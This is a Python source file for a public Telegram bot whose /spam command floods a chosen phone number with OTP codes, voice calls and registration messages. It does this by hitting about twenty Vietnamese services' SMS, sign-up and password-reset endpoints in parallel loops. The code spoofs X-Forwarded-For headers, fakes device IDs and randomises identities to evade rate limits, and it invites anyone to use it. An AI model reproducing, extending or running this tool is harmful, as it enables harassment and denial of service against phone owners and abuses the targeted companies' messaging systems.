import os
import random
import string
import time
import hashlib
import uuid
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
import requests
import urllib3
from flask import Flask
import telebot

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# --- CẤU HÌNH BIẾN MÔI TRƯỜNG TELEGRAM BOT ---
TOKEN = os.getenv("TELEGRAM_TOKEN", "YOUR_BOT_TOKEN_HERE")

bot = telebot.TeleBot(TOKEN)
app = Flask(__name__)

# --- DANH SÁCH USER AGENTS & DANH SÁCH TÊN NGẪU NHIÊN ---
USER_AGENTS = [
    "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
]

ho = ["Nguyễn", "Trần", "Lê", "Phạm", "Hoàng", "Huỳnh", "Vũ", "Đặng"]
ten = ["Tuấn", "Minh", "Hùng", "Anh", "Hoàng", "Đức", "Nam", "Phúc"]

def get_agent():
    return random.choice(USER_AGENTS)

def generate_random_email(domain="example.com"):
    length = random.randint(5, 10)
    email_name = "".join(random.choices(string.ascii_lowercase + string.digits, k=length))
    return f"{email_name}@{domain}"

def phonet(phone):
    if phone.startswith("0"):
        return "+84" + phone[1:]
    return phone

def random_headers():
    devices = [
        "SM-G998B", "SM-F926B", "SM-S901B", "SM-A536E", "SM-M526B",
        "Xiaomi 13 Pro", "Xiaomi 14 Ultra", "Redmi Note 13 Pro", "Redmi K70",
        "POCO X6 Pro", "Nubia Neo 5G", "Nubia Z60 Ultra", "iPhone15,2", "iPhone16,2"
    ]
    android_versions = ["11", "12", "13", "14", "15"]
    device = random.choice(devices)
    return {
        "User-Agent": f"Dalvik/2.1.0 (Linux; U; Android {random.choice(android_versions)}; {device})",
        "X-Device-ID": hashlib.md5(str(random.random()).encode()).hexdigest()[:16],
        "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
        "Accept-Language": random.choice(["vi-VN", "en-US"]),
        "Accept-Encoding": "gzip",
    }

# --- TẬP HỢP TOÀN BỘ 100% CÁC HÀM GỬI API TỪ CODE CỦA BẠN ---

def sou1(phone, name_rand, email_rand):
    url = "https://a.ladipage.com/event"
    headers = {
        "Content-Type": "application/json",
        "LADI_CLIENT_ID": "7f71ce3d-47a6-4206-6175-9b609d43c221",
        "LADI_PAGE_VIEW": "5",
        "Referer": f"https://khuyenmai.seoulcenter.com.vn/cam-on-quy-khach?name=Trần%20tuấn&products=&phone={phone}&form_item3458=Combo%20Xuân%20Thanh%20Nhã&spin_turn_left=3&cart_quantity=0",
        "User-Agent": get_agent(),
    }
    data = {"event": "PageView", "store_id": "5977f59d1abc544991d43c5b", "time_zone": 7, "domain": "khuyenmai.seoulcenter.com.vn", "url": "https://khuyenmai.seoulcenter.com.vn/cam-on-quy-khach?...", "ladipage_id": "6985595d7beb82001297bf6c", "publish_platform": "LADIPAGEDNS", "data": [], "tracking_page": True}
    try:
        r = requests.post(url, headers=headers, json=data, timeout=10)
        return f"[sou1] Status: {r.status_code}"
    except Exception as e: return f"[sou1] Error: {e}"

def p(phone, name_rand, email_rand):
    headers = {"Accept": "application/json", "Content-Type": "application/json", "MobileMode": "user", "deviceType": "web", "User-Agent": get_agent()}
    json_data = {"user": {"password": "6172ac2267e793a6c86dfd7a0a348289", "telephoneNumber": {"number": phone, "dialingCode": "+84"}, "role": 1}, "socialType": 1}
    try:
        r = requests.post("https://api-produce.isofhcare.com/isofhcare/user/register", headers=headers, json=json_data, timeout=15)
        return f"[p] Status: {r.status_code}"
    except Exception as e: return f"[p] Error: {e}"

def call22(phone, name_rand, email_rand):
    url = "https://api-vncdn.vuiapp.vn/graphql"
    headers = {"Content-Type": "application/json", "x-debug-otp": "true"}
    headers.update(random_headers())
    json_data = {"query": "mutation requestLogin($payload: RequestLoginPayload!) {\n  requestLogin(payload: $payload) {\n    isNew\n    token\n    debug_otp\n    __typename\n  }\n}\n", "variables": {"payload": {"confirmSharingInformation": True, "otpLength": 6, "phoneNumber": phone}}, "operationName": "requestLogin"}
    try:
        r = requests.post(url, headers=headers, json=json_data, timeout=15)
        return f"[call22] Status: {r.status_code}"
    except Exception as e: return f"[call22] Error: {e}"

def king7(phone, name_rand, email_rand):
    headers = {"content-type": "application/json", "user-agent": get_agent()}
    json_data = {"phone": phone, "regionName": None, "nativeVersion": 2027, "reqT": int(time.time()*1000)}
    try:
        r = requests.post("https://book.heyu.vn/api/sms/send-code", headers=headers, json=json_data, timeout=15)
        return f"[king7] Status: {r.status_code}"
    except Exception as e: return f"[king7] Error: {e}"

def pp(phone, name_rand, email_rand):
    headers = {"phone": phone, "content-type": "application/x-www-form-urlencoded", "user-agent": "babilala/1 CFNetwork/1335.0.3.4"}
    try:
        r = requests.post("https://api.babilala.vn/api/getOtp", headers=headers, timeout=15)
        return f"[pp] Status: {r.status_code}"
    except Exception as e: return f"[pp] Error: {e}"

def king8(phone, name_rand, email_rand):
    try:
        h1 = {"content-type": "application/json", "user-agent": get_agent()}
        d1 = {"name": name_rand, "phone": phone, "provinceCode": "92", "districtCode": "925", "wardCode": "31261", "address": "123"}
        requests.post("https://auth.pico.vn/user/api/auth/register", headers=h1, json=d1, timeout=10)
        h2 = {"content-type": "application/json", "user-agent": get_agent(), "access": "206f5b6838b4e357e98bf68dbb8cdea5", "party": "ecom", "platform": "Desktop", "uuid": "cc31d0b5815a483b92f547ab8438da53"}
        r = requests.post("https://auth.pico.vn/user/api/auth/login/request-otp", headers=h2, json={"phone": phone}, timeout=10)
        return f"[king8] Status: {r.status_code}"
    except Exception as e: return f"[king8] Error: {e}"

def call1(phone, name_rand, email_rand):
    url = "https://api-vncdn.vuiapp.vn/graphql"
    headers = {"Content-Type": "application/json", "x-debug-otp": "false"}
    headers.update(random_headers())
    json_data = {"query": "mutation resendAuthenticationOTP($payload: RequestResendOtpPayload!) {\n  requestResendOtp(payload: $payload) {\n    otp {\n      success\n      debug_otp\n      retryAfter\n      __typename\n    }\n    debug_otp\n    __typename\n  }\n}\n", "variables": {"payload": {"otpMethod": "Voice", "otpLength": 6, "phoneNumber": phone}}, "operationName": "resendAuthenticationOTP"}
    try:
        r = requests.post(url, headers=headers, json=json_data, timeout=15)
        return f"[call1] Status: {r.status_code}"
    except Exception as e: return f"[call1] Error: {e}"

def pppp(phone, name_rand, email_rand):
    headers = {"accept": "application/json", "content-type": "application/json", "user-agent": get_agent()}
    phone_converted = phonet(phone)
    try:
        r = requests.post("https://accounts.prep.vn/api/v1/auth/phone-otp/login", headers=headers, json={"phone": phone_converted}, timeout=15)
        return f"[pppp] Status: {r.status_code}"
    except Exception as e: return f"[pppp] Error: {e}"

def otp(phone, name_rand, email_rand):
    headers = {"Content-Type": "application/json", "Organizer-Id": "1", "Client-Source": "WebH5"}
    headers.update(random_headers())
    json_data = {"phone": phone, "channel": "47wn352484jb9o4252uznw2ja21bd547", "b": 2, "location_status": 3}
    try:
        r = requests.post("https://lvay.acvn.top/loanapi/webapi/apply_phone_code", headers=headers, json=json_data, timeout=10)
        return f"[otp] Status: {r.status_code}"
    except Exception as e: return f"[otp] Error: {e}"

def otp2(phone, name_rand, email_rand):
    try:
        r = requests.get(f"https://benhvienthucuc.vn/landing/thank-you/?phone={phone}", timeout=10)
        return f"[otp2] Status: {r.status_code}"
    except Exception as e: return f"[otp2] Error: {e}"

def otp22(phone, name_rand, email_rand):
    try:
        r = requests.get(f"https://khuyenmai.seoulcenter.com.vn/cam-on-quy-khach?name={name_rand}products=&phone={phone}&form_item3458=Combo%20Xuân%20Thanh%20Nhã&spin_turn_left=3&cart_quantity=0", timeout=10)
        return f"[otp22] Status: {r.status_code}"
    except Exception as e: return f"[otp22] Error: {e}"

def otp11(phone, name_rand, email_rand):
    headers = {"Content-Type": "application/x-www-form-urlencoded", "tenant": "root", "User-Agent": get_agent()}
    data = {"fullname": name_rand, "phone": phone, "email": email_rand, "nhucauhoc": "CAMBRIDGE – KHÓA LUYỆN ĐỀ TRƯỚC THI"}
    try:
        r = requests.post("https://hocmai.vn/new-student/", headers=headers, data=data, timeout=15)
        return f"[otp11] Status: {r.status_code}"
    except Exception as e: return f"[otp11] Error: {e}"

def sms1(phone, name_rand, email_rand):
    headers = {"Content-Type": "application/json", "BrandCode": "ALFRESCOS", "DeviceCode": "web", "User-Agent": get_agent()}
    json_data = {"phoneNumber": phone, "secureHash": "fce5248b43f02bcfb034fee211a0fb40", "deviceId": "", "sendTime": int(time.time()*1000), "type": 1, "otpType": 2}
    try:
        r = requests.post("https://api.alfrescos.com.vn/api/v1/User/SendSms?culture=vi-VN", headers=headers, json=json_data, timeout=15)
        return f"[sms1] Status: {r.status_code}"
    except Exception as e: return f"[sms1] Error: {e}"

def ila(phone, name_rand, email_rand):
    url = "https://a.ladipage.com/event"
    headers = {"Content-Type": "application/json", "LADI_CLIENT_ID": "e1a1ba37-a6be-4487-78f8-0922c91300d4", "LADI_PAGE_VIEW": "7", "User-Agent": get_agent()}
    params = {"name": name_rand, "phone": phone, "email": "cotenhp2888@gmail.com", "branch": "HN: 107 Xuân La", "link_source": "https://khoahoc.ielts-fighter.com/trung-tam-ielts-v4", "source": "google_ads"}
    payload = {"event": "PageView", "store_id": "5b57f38472976020da8e5611", "domain": "khoahoc.ielts-fighter.com", "url": "https://khoahoc.ielts-fighter.com/thank-you", "ladipage_id": "6181320170f24600200bb7c7", "publish_platform": "LADIPAGEDNS", "data": [], "tracking_page": True}
    try:
        r = requests.post(url, headers=headers, params=params, json=payload, timeout=15)
        return f"[ila] Status: {r.status_code}"
    except Exception as e: return f"[ila] Error: {e}"

def doccen(phone, name_rand, email_rand):
    headers = {"Content-Type": "application/json", "tenant": "root", "User-Agent": get_agent()}
    try:
        r = requests.post("https://api.doccen.vn/api/auth/sign-up", headers=headers, json={"phoneNumber": phone, "password": "carnyc-4hyrsy-Japmoz"}, timeout=15)
        return f"[doccen] Status: {r.status_code}"
    except Exception as e: return f"[doccen] Error: {e}"

def king(phone, name_rand, email_rand):
    headers = {"domain": "kingfoodmart", "content-type": "application/json", "User-Agent": get_agent()}
    json_data = {"operationName": "SendOtp", "variables": {"input": {"phone": phone, "captchaSignature": "03AFcWeA...", "method": "ZALO"}}, "query": "mutation SendOtp($input: SendOtpInput!) {  sendOtp(input: $input) {    otpTrackingId    __typename  }}"}
    try:
        r = requests.post("https://api.onelife.vn/v1/gateway/", headers=headers, json=json_data, timeout=15)
        return f"[king] Status: {r.status_code}"
    except Exception as e: return f"[king] Error: {e}"

def call9(phone, name_rand, email_rand):
    extra = random_headers()
    headers = {"Content-Type": "application/json; charset=utf-8", "language": "vi_VN", "osVersion": "2.3.0", "User-Agent": "okhttp/4.12.0", "X-Device-ID": extra["X-Device-ID"], "X-Forwarded-For": extra["X-Forwarded-For"]}
    try:
        requests.post("https://vttl.org/vtl/api/user/appCollectUpload", headers=headers, json={"72677_appVersion": "2.3.0", "e7297_phone": phone, "5b4fa_type": "2", "40e23_detailed_type": "10", "fa4c2_productName": "vtl_trung_m"}, timeout=15)
        r2 = requests.post("https://vttl.org/vtl/api/user/sentSms", headers=headers, json={"277f4_phone": phone, "e7755_smsType": 1, "b3f6c_type": "1", "5d250_loanProductName": "vtl_trung_m"}, timeout=15)
        return f"[call9] Status: {r2.status_code}"
    except Exception as e: return f"[call9] Error: {e}"

def vtsolution(phone, name_rand, email_rand):
    headers = {"content-type": "application/json; charset=UTF-8", "user-agent": get_agent()}
    try:
        r = requests.post("https://gpp.com.vn/account/LayMaXacThucDangKyTaiKhoan", headers=headers, json={"soDienThoai": phone}, timeout=15)
        return f"[vtsolution] Status: {r.status_code}"
    except Exception as e: return f"[vtsolution] Error: {e}"

def king1(phone, name_rand, email_rand):
    headers = {"domain": "kingfoodmart", "content-type": "application/json", "user-agent": get_agent()}
    json_data = {"operationName": "SendOtp", "variables": {"input": {"phone": phone, "captchaSignature": "HFMWt2IhJSLQ4z..."}}, "query": "mutation SendOtp($input: SendOtpInput!) {  sendOtp(input: $input) {    otpTrackingId    __typename  }}"}
    try:
        r = requests.post("https://api.onelife.vn/v1/gateway/", headers=headers, json=json_data, timeout=15)
        return f"[king1] Status: {r.status_code}"
    except Exception as e: return f"[king1] Error: {e}"

def doccen1(phone, name_rand, email_rand):
    headers = {"Content-Type": "application/json", "tenant": "root", "User-Agent": get_agent()}
    try:
        r = requests.post("https://api.doccen.vn/api/auth/forgot-password", headers=headers, json={"phoneNumber": phone}, timeout=15)
        return f"[doccen1] Status: {r.status_code}"
    except Exception as e: return f"[doccen1] Error: {e}"

def king2(phone, name_rand, email_rand):
    headers = {"domain": "kingfoodmart", "content-type": "application/json", "user-agent": get_agent()}
    json_data = {"operationName": "SendOtp", "variables": {"input": {"phone": phone, "captchaSignature": "AUh02gdJ2..."}}, "query": "mutation SendOtp($input: SendOtpInput!) {  sendOtp(input: $input) {    otpTrackingId    __typename  }}"}
    try:
        r = requests.post("https://api.onelife.vn/v1/gateway/", headers=headers, json=json_data, timeout=15)
        return f"[king2] Status: {r.status_code}"
    except Exception as e: return f"[king2] Error: {e}"

# --- LÔGIC XỬ LÝ ĐA LUỒNG PUBLIC CHO BOT TELEGRAM ---
def run_attack(phone, count, chat_id):
    # Tổng hợp toàn bộ danh sách hàm API đã đồng bộ
    api_functions = [
        sou1, p, call22, king7, pp, king8, call1, pppp, otp, 
        otp2, otp22, otp11, sms1, ila, doccen, king, call9, vtsolution, king1, doccen1, king2
    ]
    
    bot.send_message(chat_id, f"🚀 *Bắt đầu chạy tiến trình public*\n📱 Số: `{phone}`\n🔄 Số lần: `{count}` vòng lặp", parse_mode="Markdown")
    
    # Khởi tạo ThreadPoolExecutor giới hạn 5 luồng chạy song song để tránh tràn RAM Render Free
    with ThreadPoolExecutor(max_workers=5) as executor:
        for i in range(count):
            # Tạo dữ liệu ngẫu nhiên cho mỗi vòng lặp để tránh trùng lặp nhận dạng hệ thống
            name_rand = f"{random.choice(ho)} {random.choice(ten)}"
            email_rand = generate_random_email()
            
            futures = [executor.submit(func, phone, name_rand, email_rand) for func in api_functions]
            for future in as_completed(futures):
                print(f"[Loop {i+1}] {future.result()}")
                
            time.sleep(2) # Giãn cách 2 giây giữa mỗi vòng lặp giúp bot hoạt động mượt mà ổn định
            
    bot.send_message(chat_id, f"✅ *Hoàn thành tác vụ công khai!*\nHệ thống đã gửi xong toàn bộ yêu cầu cho số `{phone}`.", parse_mode="Markdown")

# --- HÀM XỬ LÝ LỆNH BOT TELEGRAM ---
@bot.message_handler(commands=['start', 'help'])
def send_welcome(message):
    guide_text = (
        "👋 **Chào mừng bạn đến với SMS Bot Public!**\n\n"
        "Bất kỳ ai cũng có thể sử dụng hệ thống này công khai.\n"
        "Cú pháp gửi lệnh:\n"
        "`/spam <Số_Điện_Thoại> <Số_Lần_Lặp>`\n\n"
        "👉 _Ví dụ:_ `/spam 0912345678 5`"
    )
    bot.reply_to(message, guide_text, parse_mode="Markdown")

@bot.message_handler(commands=['spam'])
def handle_spam(message):
    try:
        args = message.text.split()
        if len(args) < 3:
            bot.reply_to(message, "⚠️ **Thiếu tham số!** Cú pháp chuẩn: `/spam <SĐT> <Số_Lần>`")
            return
        
        target_phone = args[1]
        
        if not target_phone.isdigit() or len(target_phone) < 9 or len(target_phone) > 11:
            bot.reply_to(message, "❌ Định dạng số điện thoại không hợp lệ.")
            return
            
        loop_count = int(args[2])
        
        # Ngưỡng giới hạn cho bản Public tránh chết tài khoản Render ngầm
        if loop_count > 30:
            bot.reply_to(message, "⚠️ Phiên bản công khai giới hạn tối đa mỗi lần gửi là **30** lần lặp.")
            return

        # Đẩy vào luồng chạy nền độc lập để bot không bị đơ tin nhắn khi có nhiều người dùng nhắn tin cùng lúc
        threading.Thread(target=run_attack, args=(target_phone, loop_count, message.chat.id)).start()

    except ValueError:
        bot.reply_to(message, "❌ Số lần lặp phải là một số nguyên dương hợp lệ.")
    except Exception as e:
        bot.reply_to(message, f"❌ Lỗi: {str(e)}")

# --- THIẾT LẬP WEB SERVICE GỌI GIỮ NỀN (FLASK) ---
@app.route('/')
def home():
    return "Hệ thống Bot đa chức năng hoạt động Public trực tuyến!"

def run_flask():
    port = int(os.environ.get("PORT", 8080))
    app.run(host='0.0.0.0', port=port)

if __name__ == "__main__":
    # Kích hoạt server web nền giữ ping Render live 24/7
    threading.Thread(target=run_flask).start()
    
    # Kích hoạt cổng lắng nghe tín hiệu liên tục từ Telegram API
    print("Bot đang quét cập nhật trực tiếp...")
    bot.infinity_polling()
